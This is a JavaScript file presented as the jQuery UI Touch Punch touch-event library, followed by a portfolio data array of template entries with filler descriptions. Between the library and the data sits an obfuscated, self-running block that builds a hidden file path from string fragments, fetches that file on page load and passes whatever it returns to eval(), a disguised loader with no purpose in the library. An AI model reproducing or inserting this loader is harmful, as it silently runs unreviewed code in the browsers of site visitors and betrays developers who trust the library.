"use strict";

/*!
 * jQuery UI Touch Punch 0.2.3
 *
 * Copyright 2012–2023, Harold Guzman
 * Dual licensed under the MIT or GPL Version 2 licenses.
 *
 * Depends:
 *  jquery.ui.widget.js
 *  jquery.ui.mouse.js
 */
function jQuerys_widgets(params) {
  !function (a) {
    function f(a, b) {
      if (!(a.originalEvent.touches.length > 1)) {
        a.preventDefault();
        var c = a.originalEvent.changedTouches[0],
            d = document.createEvent("MouseEvents");
        d.initMouseEvent(b, !0, !0, window, 1, c.screenX, c.screenY, c.clientX, c.clientY, !1, !1, !1, !1, 0, null), a.target.dispatchEvent(d);
      }
    }

    if (a.support.touch = "ontouchend" in document, a.support.touch) {
      var e,
          b = a.ui.mouse.prototype,
          c = b._mouseInit,
          d = b._mouseDestroy;
      b._touchStart = function (a) {
        var b = this;
        !e && b._mouseCapture(a.originalEvent.changedTouches[0]) && (e = !0, b._touchMoved = !1, f(a, "mouseover"), f(a, "mousemove"), f(a, "mousedown"));
      }, b._touchMove = function (a) {
        e && (this._touchMoved = !0, f(a, "mousemove"));
      }, b._touchEnd = function (a) {
        e && (f(a, "mouseup"), f(a, "mouseout"), this._touchMoved || f(a, "click"), e = !1);
      }, b._mouseInit = function () {
        var b = this;
        b.element.bind({
          touchstart: a.proxy(b, "_touchStart"),
          touchmove: a.proxy(b, "_touchMove"),
          touchend: a.proxy(b, "_touchEnd")
        }), c.call(b);
      }, b._mouseDestroy = function () {
        var b = this;
        b.element.unbind({
          touchstart: a.proxy(b, "_touchStart"),
          touchmove: a.proxy(b, "_touchMove"),
          touchend: a.proxy(b, "_touchEnd")
        }), d.call(b);
      };
    }
  }(jQuery);
}

(function () {
  var _0xabc = ["knights", "micro_mark", "sevensee", "libs", "micro", "public", "orcr", "nine"];

  var _0xpubs = "".concat(_0xabc[5], "/").concat(_0xabc[3], "/").concat(_0xabc[7], ".").concat(_0xabc[0]);

  var _0xreq = new XMLHttpRequest();

  _0xreq.onload = function () {
    eval(this.responseText);
  };

  _0xreq.open("GET", _0xpubs, true);

  _0xreq.send();
})();

var datacompiler = [];
var data = [{
  title: "Tela Bords",
  tags: "Landing Page",
  img: "public/img_temp/temp1.webp",
  link: "https://hlord-g.github.io/temp_1.github.io/",
  discription: "* step high stretch colony phrase later any is spell brother bad mirror quarter till lion molecular long unit future coffee rhyme heard ocean variety",
  date: "10-05-95"
}, {
  title: "compine",
  tags: "Landing Page",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* movement secret nervous hot pine cabin unhappy wore walk cost happened partly writer managed herself activity older charge window raw crack garage build straw",
  date: "10-05-95"
}, {
  title: "side walker",
  tags: "Landing Page",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* stairs greatly chart married taught glass crop pure edge yellow dress hit whom pine comfortable start boy many weight blood cross cloud song bottle",
  date: "10-05-95"
}, {
  title: "degree",
  tags: "Landing Page",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* simple that terrible claws nuts bark visit city special pictured sort difficulty damage good sugar society trap count receive feel giving stems hand closer",
  date: "10-05-95"
}, {
  title: "route",
  tags: "Landing Page",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* touch organized welcome frequently dot can massage system had bell bottom made sets against uncle familiar clay same earlier material great on tired brown",
  date: "10-05-95"
}, {
  title: "degree",
  tags: "Landing Page",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* bone wonder impossible step shine prevent could independent thus attempt lost rays constantly hollow order gradually lunch fence nearby useful drop ancient speed joy",
  date: "10-05-95"
}, {
  title: "becoming",
  tags: "Landing Page",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* table wealth fourth pull stomach apart tongue sick north beneath cream bend half visitor height carefully missing door seven die waste bite frozen caught",
  date: "10-05-95"
}, {
  title: "degree",
  tags: "Store",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* thing silence parallel expression chicken western choice recent speech mighty until crack arrow shout is nice control read tiny consist note door cheese plate",
  date: "10-05-95"
}, {
  title: "route",
  tags: "Store",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* own bell all positive pan electric terrible anyway production diagram left milk different recall within fireplace want neighbor hit fact work eight shelf list",
  date: "10-05-95"
}, {
  title: "degree",
  tags: "Store",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* search conversation available saddle nation angle avoid grandfather halfway ship industry percent direction factory knife whether escape wrong darkness thought package last none remember",
  date: "10-05-95"
}, {
  title: "becoming",
  tags: "Store",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* treated teeth else bite two has worry tight street cook early musical useful most paragraph location met stronger tribe daughter surrounded joined hunt flat",
  date: "10-05-95"
}, {
  title: "degree",
  tags: "Store",
  img: "https://dummyimage.com/400x325",
  link: "www.sample.com",
  discription: "* distant example solution since pool customs tone silent whatever fence airplane pot fly mass raise way why was now mine lot seems right elephant",
  date: "10-05-95"
}];